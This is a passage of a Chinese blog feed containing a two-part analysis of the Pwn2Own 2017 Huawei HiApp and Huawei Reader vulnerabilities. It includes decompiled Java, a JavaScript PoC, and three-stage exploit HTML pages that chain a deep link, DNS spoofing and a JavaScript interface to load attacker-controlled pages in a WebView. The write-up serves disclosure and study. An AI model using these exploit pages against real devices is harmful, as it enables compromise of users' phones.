class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initView</span><span class="params">(Context arg6, Request arg7)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>.mContext = arg6;</span><br><span class="line">       WebSettings v0 = <span class="keyword">this</span>.webview.getSettings();</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">this</span>.webview.removeJavascriptInterface(<span class="string">&quot;accessibility&quot;</span>);</span><br><span class="line">       <span class="keyword">this</span>.webview.removeJavascriptInterface(<span class="string">&quot;accessibilityTraversal&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span>(Build$VERSION.SDK_INT &gt;= <span class="number">17</span>) &#123;</span><br><span class="line">           <span class="keyword">this</span>.webview.removeJavascriptInterface(<span class="string">&quot;searchBoxJavaBridge_&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">this</span>.webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);<span class="comment">//允许执行js脚本</span></span><br><span class="line">       <span class="keyword">this</span>.webview.requestFocus();</span><br><span class="line">       <span class="keyword">this</span>.webview.setWebViewClient(<span class="keyword">new</span> InternalWebViewClient(<span class="keyword">this</span>));</span><br><span class="line">       <span class="keyword">this</span>.webview.setWebChromeClient(<span class="keyword">new</span> MarketWebChromeClient(<span class="keyword">this</span>));</span><br><span class="line">       <span class="keyword">this</span>.webview.getSettings().setBlockNetworkImage(<span class="keyword">true</span>);</span><br><span class="line">       <span class="keyword">this</span>.webview.addJavascriptInterface(<span class="keyword">new</span> HiSpaceObject(<span class="keyword">this</span>.mContext, ((JsCallBackOjbect)<span class="keyword">this</span>), <span class="keyword">this</span>.webview), <span class="string">&quot;HiSpaceObject&quot;</span>);  <span class="comment">// 关键点,暴露了一个对象</span></span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>审计此代码可以发现<code>setJavaScriptEnabled(true)</code>可执行js脚本,上篇分析我们已经可以通过DNS欺骗,使得最终加载的url为我们可构造的任意页面或脚本，也即是可控制js输入。</p><p>关于addJavascriptInterface的用法，可阅读参考文章。关键点就是HiSpaceObject.class类中的 @JavascriptInterface注解,有此注解的方法也就是我们可以控制调用的方法。其中包括安装APP,卸载APP等等函数。</p><p>根据漏洞作者描述,他们的主要目的是寻找RCE,而HiApp中又无法触发,因此需要寻找其他App的漏洞来触发，因此这里的重点是分析能不能启动其他App,而恰好又暴露了这样的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JavascriptInterface</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">launchApp</span><span class="params">(String pkgName, String uri)</span> </span>&#123;</span><br><span class="line">        URISyntaxException excrpt;</span><br><span class="line">        Intent intent;</span><br><span class="line">        a.a(<span class="string">&quot;HiSpaceObject&quot;</span>, <span class="string">&quot;launchApp&quot;</span>);</span><br><span class="line">        Intent newIntent = <span class="keyword">new</span> Intent();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            intent = Intent.parseUri(uri, <span class="number">0</span>);<span class="comment">//关键点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(URISyntaxException v0) &#123;</span><br><span class="line">            URISyntaxException v5 = v0;</span><br><span class="line">            intent = newIntent;</span><br><span class="line">            excrpt = v5;</span><br><span class="line">            goto label_15;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            intent.setPackage(pkgName);</span><br><span class="line">            goto label_8;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(URISyntaxException excrpt) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    label_15:</span><br><span class="line">        a.d(<span class="string">&quot;HiSpaceObject&quot;</span>, <span class="string">&quot;uri error!&quot;</span> + excrpt.toString());</span><br><span class="line">    label_8:</span><br><span class="line">        <span class="keyword">this</span>.mActivity.startActivity(intent);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>分析以上代码我们可以发现,主要是需要两个参数,pkgName和Uri，最后调用startActivity去启动Activity。</p><p>这里自然就有问题了,如果没有办法传递一些extra到activity,那便是没有我们可以控制的数据流，也因此是没用的。但是由于调用了<code>Intent.parseUri(uri, 0);</code>,那么是否有突破的机会？</p><p>通过查看源码可知(详见参考Intent.java)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* Flag for use with &#123;@link #toUri&#125; and &#123;@link #parseUri&#125;: the URI string</span><br><span class="line">* always has the &quot;android-app:&quot; scheme.  This is a variation of</span><br><span class="line">* &#123;@link #URI_INTENT_SCHEME&#125; whose format is simpler for the case of </span><br><span class="line">* http/https URI being delivered to a specific package name.  The format</span><br><span class="line">* is:</span><br><span class="line">* <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">&quot;prettyprint&quot;</span>&gt;</span></span><br><span class="line">* android-app://&#123;package_id&#125;[/&#123;scheme&#125;[/&#123;host&#125;[/&#123;path&#125;]]][#Intent;&#123;...&#125;]</span><br><span class="line">* <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因此可构造漏洞作者给出的PoC:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pkg = <span class="string">&quot;com.huawei.hwireader&quot;</span>;<span class="keyword">var</span> uri = <span class="string">&quot;android-app://http/www.google.co.uk/#Intent;component=com.huawei.hwireader/com.zhangyue.iRe ader.online.ui.ActivityWeb;action=com.huawei.hwireader.SHOW_DETAIL;S.url=http://192 .168.137.1:8000/stage3.html;end&quot;</span>;<span class="built_in">window</span>.HiSpaceObject.launchApp(pkg,uri);</span><br></pre></td></tr></table></figure><p><code>http://192.168.137.1:8000/stage3.html</code> 这里加载的URL即为攻击payload</p><h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>可以本地搭建环境,也可使用vps。首先构造恶意网站exploit.html。诱导用户在浏览器中访问该页面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>exploit huawei<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">&quot;text/javascript&quot;</span>&gt;</span> </span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.location = <span class="string">&quot;hiapp://com.huawei.appmarket?activityName=activityUri|webview.activity&amp;params=&#123;&#x27;params&#x27; : [ &#123; &#x27;name&#x27; : &#x27;uri&#x27;, &#x27;type&#x27; : &#x27;String&#x27;, &#x27;value&#x27; : &#x27;internal_webview&#x27; &#125;, &#123; &#x27;name&#x27; : &#x27;url&#x27;, &#x27;type&#x27; : &#x27;String&#x27;, &#x27;value&#x27; : &#x27;http://www.vmall.com/exploit2.html&#x27; &#125; ] &#125;&amp;channelId=1&quot;</span>;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>紧接着使用DNS欺骗,目的是当<code>internal_webview</code>解析<code>www.vmall.com</code>时指向的ip地址为恶意攻击地址,同时构造exploit2.html,如下.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>exploit huawei stage 2 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> pkg = <span class="string">&quot;com.huawei.hwireader&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> uri = <span class="string">&quot;android-app://http/www.google.co.uk/#Intent;component=com.huawei.hwireader/com.zhangyue.iReader.online.ui.ActivityWeb;action=com.huawei.hwireader.SHOW_DETAIL;S.url=http://www.tasfa.cn/stage3.html;end&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.HiSpaceObject.launchApp(pkg,uri);</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>exploit2.html的主要作用是调起IReader APP的存在漏洞的WebView,并使其加载任意的url。这里加载第三阶段我们可以控制的exploit3.html代码。</p><p>本次实验exploit3.html使用代码如下:(其他具体利用代码将在之后的分析报告中阐述)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">title</span>&gt;</span>exploit huawei stage 3 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">          alert(<span class="string">&#x27;pwn huawei&#x27;</span>);</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>完整过程可查看下面GIF:</p><p><img src="/Users/tasfa/Downloads/pwnHW.gif" alt="pwnhwGif"></p><h3 id="0x04-漏洞总结"><a href="#0x04-漏洞总结" class="headerlink" title="0x04 漏洞总结"></a>0x04 漏洞总结</h3><p>完整的攻击链路为: </p><ol><li>诱导用户访问恶意网站exploit.html。</li><li>使用DNS劫持或其他方式,绕过internal_webview的域名白名单限制。</li><li>调用起其他APP存在漏洞的可利用的webView,加载恶意攻击页面,从而完成整个攻击链路。</li></ol><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p><a href="https://www.cnblogs.com/renhui/p/5899520.html">Android 4.2版本以下使用WebView组件addJavascriptInterface方法存在JS漏洞</a></p><p><a href="https://www.jianshu.com/p/ed0846a16659">使用 addJavaScriptInterface() 方法在 WebView 中绑定 Java 对象</a></p><p><a href="http://androidxref.com/7.0.0_r1/xref/frameworks/base/core/java/android/content/Intent.java#4664">Intent.java</a></p><h3 id="0x06-声明"><a href="#0x06-声明" class="headerlink" title="0x06 声明"></a>0x06 声明</h3><p>本文章仅做学习研究用途，其他非法用途，本人概不负责。建议华为手机用户尽快更新HiApp以及IReader应用，以免遭到入侵控制，造成损失。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/terminal/172780.html&quot;&gt;Pwn2Own华为HiApp漏洞原理与利用分析(上)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;阅读本篇的基础是先理解上篇的攻击构造链路。&lt;/p&gt;
&lt;h3 id=&quot;0x02-漏洞分析&quot;&gt;&lt;a href=&quot;#0x02-漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;0x02 漏洞分析&quot;&gt;&lt;/a&gt;0x02 漏洞分析&lt;/h3&gt;&lt;p&gt;不知道有没有细心的同学发现我在上篇分析文章中留下的&lt;strong&gt;彩蛋&lt;/strong&gt;。&lt;br&gt;本篇自然是从这个彩蛋切入.&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android漏洞" scheme="http://example.com/tags/Android%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Pwn2Own华为HiApp漏洞原理与利用分析(上)</title>
    <link href="http://example.com/2018/10/03/Pwn2Own%E5%8D%8E%E4%B8%BAHiApp%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-%E4%B8%8A/"/>
    <id>http://example.com/2018/10/03/Pwn2Own%E5%8D%8E%E4%B8%BAHiApp%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-%E4%B8%8A/</id>
    <published>2018-10-03T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.206Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>ps:本文从攻击者的角度来分析如何发现Pwn2Own华为手机漏洞，但不代表与漏洞发现者的思路相同，仅供参考。本系列漏洞分析由于涉及大量代码分析，所以拆分为四部分，也比较容易阅读和理解消化。</p><p>攻击视频详细可参见<a href="https://www.thezdi.com/blog/2017/11/2/the-results-mobile-pwn2own-2017-day-two">Pwn2own Blog</a></p><p>官方公告: <a href="http://www.huawei.com/en/psirt/security-advisories/huawei-sa-20171120-01-hwreader-en">http://www.huawei.com/en/psirt/security-advisories/huawei-sa-20171120-01-hwreader-en</a></p><p>漏洞可直接造成任意目录遍历、删除、任意代码执行等高危操作</p><span id="more"></span><p>漏洞版本:</p><ul><li>Huawei Read – 8.0.1.303</li><li>HiApp – 7.3.0.305</li></ul><h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h3><h4 id="第一部分-HiApp白名单绕过"><a href="#第一部分-HiApp白名单绕过" class="headerlink" title="第一部分 HiApp白名单绕过"></a>第一部分 HiApp白名单绕过</h4><p>首先找到切入点，即AndroidManifest.xml中，审计发现有一个Activity暴露了出来(默认exported = true),依此作为切入点，进入到<br><code>com.huawei.appmarket.service.externalapi.view.ThirdApiActivity</code> 中查看源代码进行分析。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:configChanges</span>=<span class="string">&quot;orientation|screenSize&quot;</span> <span class="attr">android:launchMode</span>=<span class="string">&quot;singleTop&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.huawei.appmarket.service.externalapi.view.ThirdApiActivity&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/loading_activity_style&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;details&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;appmarket&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;search&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;market&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;a.vmall.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;com.huawei.appmarket&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;hiapp&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>切入<code>ThirdApiActivity.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.setTitle();</span><br><span class="line">    <span class="keyword">this</span>.protocolPolicy = DefaultProtocolPolicy.getProtocolPolicy();</span><br><span class="line">    <span class="keyword">this</span>.protocolPolicy.onCreate(<span class="keyword">this</span>, arg2);  <span class="comment">// 初始化了protocolPolicy</span></span><br><span class="line">    <span class="keyword">super</span>.onCreate(arg2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreateContinue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.action = ExternalActionController.getAction(((CallBack)<span class="keyword">this</span>));  <span class="comment">// 初始化action</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.action == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.finish();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.protocolPolicy.check(<span class="keyword">this</span>, <span class="keyword">this</span>.action.useCacheProtocol()); <span class="comment">//切入关键点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着进入check函数进行查看，可以看到经过函数**l.a()**检查后，回调onAgree函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(ThirdApiActivity mThirdApiActivity, <span class="keyword">boolean</span> flag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!l.a()) &#123;</span><br><span class="line">            mThirdApiActivity.onShow();</span><br><span class="line">            l.a(mThirdApiActivity.getActivity(), <span class="keyword">new</span> ProtocolResultHandler(((IProtocolCheck)mThirdApiActivity)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            mThirdApiActivity.onAgree();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而后onAgree函数调用了this.action的onAction函数。那么我们的目标就是需要追踪到对应action类的onAction函数再分析其逻辑，方法是先查看上述getAction函数，找出对应action的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IExternalAction <span class="title">getAction</span><span class="params">(CallBack callBack)</span> </span>&#123;</span><br><span class="line">        ... <span class="comment">//代表省略一些无关代码，简化阅读</span></span><br><span class="line">        Intent intent = callBack.getIntent();</span><br><span class="line">        ...</span><br><span class="line">        String action = intent.getAction();</span><br><span class="line">        <span class="keyword">if</span>(TextUtils.isEmpty(((CharSequence)action))) &#123;</span><br><span class="line">            action = <span class="string">&quot;com.huawei.appmarket.ext.public&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object clazz = ExternalActionController.ACTIVITY_MAPS.get(action);<span class="comment">//关键在这里获取到Action对应的Class，也即由ACTIVITY_MAPS中获取</span></span><br><span class="line">        ...</span><br><span class="line">        clazz = ((Class)clazz).getConstructor(CallBack.class).newInstance(callBack);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>那么接下来的思路就是获取ACTIVITY_MAPS的内容，首先自然需要找到put值的地方，然后通过寻找引用就能找到赋值的地方。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(String arg1, Class arg2)</span> </span>&#123;</span><br><span class="line">        ExternalActionController.ACTIVITY_MAPS.put(arg1, arg2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查找register函数的引用,即可查找到init函数调用该函数进行注册，具体有两处，如下代码。可以看到，响应<strong>android.intent.action.VIEW</strong>这个Action的类有两个，分别是ViewAction.class和<br>AppViewAction.class,实际上二者为子父类关系。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.ext.public&quot;</span>, ExtPublicAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.intent.action.AppDetail&quot;</span>, AppDetailAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.appmarket.intent.action.AppDetail.withapp&quot;</span>, AppDetailAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.appmarket.intent.action.AppDetail.withid&quot;</span>, AppDetailAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.appmarket.intent.action.AppDetail.withURL&quot;</span>, AppDetailAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.appmarket.intent.action.AppDetail.withdetailId&quot;</span>, AppDetailAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;android.intent.action.VIEW&quot;</span>, ViewAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.service.externalapi.actions.AppUninstallAction&quot;</span>, AppUninstallAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.intent.action.PROTOCOL&quot;</span>, ProtocolAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.intent.action.LOGIN&quot;</span>, LoginAction.class);</span><br><span class="line">        ExternalActionController.register(ActionName.BATCH_UPDATE_ACTION, BatchUpdateAction.class);</span><br><span class="line">        ExternalActionController.register(ActionName.UPDATE_APP_ACTION, UpdateAppAction.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.appmarket.intent.action.appmovemanager&quot;</span>, AppMoveAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.emui.barcode.result&quot;</span>, EMUIBarCodeAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.service.appmgr.apkmanagement.activity.apkmanagement&quot;</span>, ApkManagerAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.intent.action.launcher.downloadmanager&quot;</span>, LauncherManagerApp.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.appmarket.intent.action.appmanager&quot;</span>, AppUpdateAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.appmarket.intent.action.SearchActivity&quot;</span>, SearchAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.service.externalapi.actions.PayZoneAction&quot;</span>, PayZoneAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;android.intent.action.VIEW&quot;</span>, AppViewAction.class);</span><br><span class="line">        ExternalActionController.register(<span class="string">&quot;com.huawei.appmarket.intent.action.ThirdUpdateAction&quot;</span>, ThirdAppUpdateAction.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上面我们知道响应<strong>android.intent.action.VIEW</strong>这个Action的类为ViewAction.class,也即是调用了ViewAction.onAction。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">this</span>.callback.getIntent();</span><br><span class="line">        uri = intent.getData();</span><br><span class="line">        ...</span><br><span class="line">       </span><br><span class="line">        String scheme = uri.getScheme();</span><br><span class="line">        String host = uri.getHost();</span><br><span class="line">        ... </span><br><span class="line">        <span class="keyword">this</span>.handlerUri(uri, 